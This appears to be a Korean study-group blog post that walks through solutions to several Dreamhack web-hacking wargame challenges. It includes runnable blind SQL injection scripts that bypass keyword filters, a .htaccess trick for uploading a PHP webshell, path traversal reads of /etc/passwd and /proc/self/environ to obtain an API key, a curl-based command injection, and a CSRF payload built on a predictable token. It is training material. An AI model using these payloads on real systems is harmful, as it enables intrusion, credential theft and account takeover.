---
title: "[CAUTION] 여름방학 스터디 - 2"
categories:
  - study
tags:
  - dreamhack
  - webhacking
toc: true
toc_sticky: true
toc_label: "여름방학 스터디 - 2"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/caution2.jpg
---

💡 Caution 여름방학 스터디 2회차
{: .notice--warning}

# sql injection bypass WAF Advanced
**[sql injection bypass WAF Advanced](https://dreamhack.io/wargame/challenges/416/)**

쿼리문은 다음과 같다.

![image](https://user-images.githubusercontent.com/33647663/180632495-0d7a2b9f-2704-4a37-ac1d-648fba81d2f6.png)

필터링 되는 문자열은 다음과 같다.

```py
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
```

필터링 되는 문자열들을 사용하지 않고 blind sql injection을 사용하여 비밀번호를 알아내는 문제이다.

우선 `and`,`or`에 대한 필터링 우회는 `&&`,`||`로 우회 가능하고 필터링에서 모든 공백관련된 키워드들이 들어가 있기 때문에 쿼리문 작성시 공백이 없어야 한다. 

작성한 페이로드는 다음과 같다. 비밀번호 길이가 길기 때문에 이진 탐색 알고리즘을 활용하였다.

```py
import requests

url = "http://host3.dreamhack.games:17510/"
params = {
    'uid' : ''
}

# 비밀번호 길이

for i in range(40,50):
    payload="'||substr(uid,1,4)='admi'&&length(upw)={}#".format(i)
    params['uid'] = payload
    response = requests.get(url,params=params)
    print(i,len(response.text))
#    print(response.text)

# 비밀번호 길이는 44. 이 경우면 이진탐색

TRUE_FLAG = 'admin'
flag = ''
for idx in range(1,45):
    start,end = 0,127
    while True:
        search = ( start + end ) // 2
        payload = f"'||substr(uid,1,4)='admi'&&ascii(substr(upw,{idx},1))>{search}#"
        params['uid'] = payload

        print(params)
        response = requests.get(url,params=params)
        if(TRUE_FLAG in response.text):
            start = search
        else:
            payload = f"'||substr(uid,1,4)='admi'&&ascii(substr(upw,{idx},1))={search}#"
            params['uid'] = payload
            print(params)
            response = requests.get(url,params=params)
            if(TRUE_FLAG in response.text):
                flag += chr( search )
                print(flag)
                break
            end = search
    
```

# sql injection bypass WAF
**[sql injection bypass WAF Advanced](https://dreamhack.io/wargame/challenges/415/)**

이 문제보다 advanced 문제를 먼저 풀었다. 위의 1번 문제 코드를 그대로 사용하면 이 문제도 풀린다. 

# Apache htaccess
**[Apache htaccess](https://dreamhack.io/wargame/challenges/418/)**

이 문제에는 파일 업로드 기능이 있다. 웹쉘을 업로드 하기 위해서 확장자 필터링이 있는지 확인해 보면 필터링 되는 확장자 명은 다음과 같다.

```php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");
```

이때 설정 파일을 보면 **AllowOverride All** 이 설정되어 있다. 따라서 .htaccess 파일을 업로드 하여 우회가 가능하다.


```sh
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

   <Directory /var/www/html/>
     AllowOverride All
     Require all granted
   </Directory>
</VirtualHost>

```

.htaccess 파일을 다음과 같이 작성하고 서버에 올려준다.

```sh
AddType application/x-httpd-php .php8
```

위의 파일의 내용은 .php8 확장자 파일도 서버에서 php 파일로 처리한다는 의미이다. 이제 php 웹쉘 파일을 확장자가 .php8이 되도록 바꿔준뒤 서버에 업로드 해준다.


![image](https://user-images.githubusercontent.com/33647663/180632820-86bfbaa0-02ce-495c-9bc7-a69fc4c164c7.png)

성공적으로 업로드 되었다. 해당 파일에 접근하면 웹쉘이 열린다.

![image](https://user-images.githubusercontent.com/33647663/180632852-549d23d7-be18-4453-92d1-0802141160ab.png)


# File Vulnerability Advanced for linux
**[File Vulnerability Advanced for linux](https://dreamhack.io/wargame/challenges/417/)**

우선 코드 중 다음 부분을 보면 path traversal 취약점이 존재한다.

```py
@app.route('/file', methods=['GET'])
def file():
    path = request.args.get('path', None)
    if path:
        data = open('./files/' + path).read()
        return data
    return 'Error !'
```

path = ../../../../../etc/passwd 를 입력해 보면 다음과 같이 파일을 읽을 수 있다.

![image](https://user-images.githubusercontent.com/33647663/180632918-a0dcb829-1f9d-4847-bc75-ec1758072959.png)


다음 단계로 진행하기 위해서 다음 코드를 보자

```py
@app.route('/admin', methods=['GET'])
@key_required
def admin():
    cmd = request.args.get('cmd', None)
    if cmd:
        result = subprocess.getoutput(cmd)
        return result
    else:
        return 'Error !'
```

cmd 인자로 시스템 함수를 실행해 주는데 이때, ```@key_required```가 설정되어 있다. 

key_required()함수는 다음과 같다.
```py
API_KEY = os.environ.get('API_KEY', None)

def key_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.args.get('API_KEY', None)
        if API_KEY and apikey:
            if apikey == API_KEY:
                return view(**kwargs)
        return 'Access Denined !'
    return wrapped_view
```

시스템 환경변수에 설정되어 있는 API_KEY 라는 환경변수 값을 알아야 한다.

현재 /file에서 시스템에 있는 모든 파일을 읽을 수 있으니까 /proc 디렉터리에서 환경변수를 읽을 수 있는 파일이 존재하는지 확인해 본다.

찾아보니 environ 파일이 존재하고 해당 파일에서는 환경변수를 저장하고 있었다. 따라서 /proc/self/environ을 호출하면 환경변수를 알아낼 수 있다.

![image](https://user-images.githubusercontent.com/33647663/180633019-29650d3e-5f35-4b36-b4c0-e41053c787d1.png)

API_KEY 값을 알아냈으므로 /admin에서 시스템 명령어 사용이 가능하다.

![image](https://user-images.githubusercontent.com/33647663/180633061-67308a6c-8c78-4dd5-8d02-d2473128f93e.png)

# Command Injection Advanced
**[Command Injection Advanced](https://dreamhack.io/wargame/challenges/413/)**

명령어 삽입 취약점 관련된 문제로 우선 escapeshellcmd()함수가 적용되어 있어서 쉘 관련된 특수문자들이 모두 차단되어 있었다.

```php
$url = $_GET['url'];
if(strpos($url, 'http') !== 0 ){
  die('http only !');
}else{
  $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
  $cache_file = './cache/'.md5($url);
  file_put_contents($cache_file, $result);
  echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
  echo '<pre>'. htmlentities($result) .'</pre>';
  return;
}
```

첫번째 조건인 strpos() 부분은 http://www.naver.com 같이 입력하는 것이 아닌, scheme 부분을 file:///etc/passwd같이 입력하지 못하도록 막고 있다. 

우회 방법은 curl 명령어의 옵션 중 -o 옵션을 이용하여 외부 파일을 서버에 저장하도록 하는 것이다.

![image](https://user-images.githubusercontent.com/33647663/180633270-3de4c948-ec84-4b5e-9cc1-bfd8358e5882.png)


![image](https://user-images.githubusercontent.com/33647663/180633281-1a2c9190-a45d-42de-9342-42377c1aafc4.png)

그러면 curl 결과가 ./cache/shell.php 파일에 저장될 것이고 이 주소로 접근하여 웹쉘 실행이 가능하다.

![image](https://user-images.githubusercontent.com/33647663/180633301-3818a7fc-61a8-4a16-b027-331322372f84.png)


# blind sql injection advanced
**[blind sql injection advanced](https://dreamhack.io/wargame/challenges/411/)**

한글이 db에 저장된 조금 특별한 blind sql injection 공격이다. 
이번엔 bit 연산을 이용해서 한 비트씩 db에서 데이터를 뽑아냈다.

전체 코드는 다음과 같다.

```py
import requests

url = "http://host3.dreamhack.games:18199/"
params = {
    'uid' : ''
}

TRUE_FLAG = "exists"

# 비밀번호 길이 구하기
length=1
pw_len = 0
while True:

    payload = f"'||uid='admin'&&char_length(upw)={length}#"
    params["uid"] = payload
    print(payload)
    response = requests.get(url,params=params)

    if( TRUE_FLAG in response.text):
        pw_len = length
        print("pw_len : ",pw_len)
        break
    length+=1
    
idx = 1
flag = []
for idx in range(1,pw_len + 1):
    # 하나의 글자가 몇 byte인지 체크
    char_byte = 0     
    for i in range(1,5):
        payload = f"'||uid='admin'&&length(substr(upw,{idx},1))={i}#"
        params["uid"] = payload
        print(payload)
        response = requests.get(url,params=params)
        if( TRUE_FLAG in response.text ):
            char_byte = i
            print(f"{idx} : {char_byte}bytes")
            break
    
    bit_len = 0
    for i in range(8):
        payload = f"'||uid='admin'&&length(bin(ord(substr(upw,{idx},1))))={char_byte*8-i}#"
        params["uid"] = payload
        print(payload)
        response = requests.get(url,params=params)
        if( TRUE_FLAG in response.text ):
            bit_len = char_byte*8 - i
            print(f"{idx} : {bit_len}bits")
            break
    sub_flag = ''
    for i in range(1, bit_len + 1):
        payload = f"'||uid='admin'&&substr(bin(ord(substr(upw,{idx},1))),{i},1)=1#"
        params["uid"] = payload
        print(payload)
        response = requests.get(url,params=params)
        if( TRUE_FLAG in response.text ):
            sub_flag +='1'
        else:
            sub_flag +='0'
    

        
    flag.append(int(sub_flag,2).to_bytes(char_byte,"big").decode("utf-8"))
    print(flag)

flag_str = ''.join(flag)
print(flag_str)
```

![image](https://user-images.githubusercontent.com/33647663/180633459-d3f8cd73-906a-4a94-abdd-961ac9d68472.png)


# CSRF Advanced
**[CSRF Advanced](https://dreamhack.io/wargame/challenges/442/)**

csrf 취약점을 이용하는 문제로 비밀번호 변경시 취약한(예측 가능한) csrf 토큰을 사용하고 있다.

```py
md5((username + request.remote_addr).encode()).hexdigest()
```

토큰을 위와같이 생성하고 있기 때문에 예측이 가능하다.
admin + 127.0.0.1의 토큰을 다음과 같이 구해준다.


![image](https://user-images.githubusercontent.com/33647663/180633554-3e88d06c-1472-44d9-b30c-8e38967f2881.png)

실행 결과는 다음과 같다.
```sh
7505b9c72ab4aa94b1a4ed7b207b67fb
```

이제 이를 이용해서 csrf 를 수행한다.

/flag 페이지에서 다음과 같이 페이로드를 건네준다.

```
<img src="/change_password?pw=flag&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
```

그러면 봇이 /vuln 페이지에서 ```<img src="/change_password?pw=flag&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">``` 를 수행할 것이고 봇이 /change_password 페이지에 접속하여 csrf 토큰 검증을 통과하여 admin 계정의 비밀번호가 바뀌는 csrf 공격이 수행된다.

이제 admin/flag 로 로그인 하면 다음과 같이 flag를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/33647663/180633647-cc3f0411-deb2-44a0-9f0b-4b5900fe11ee.png)

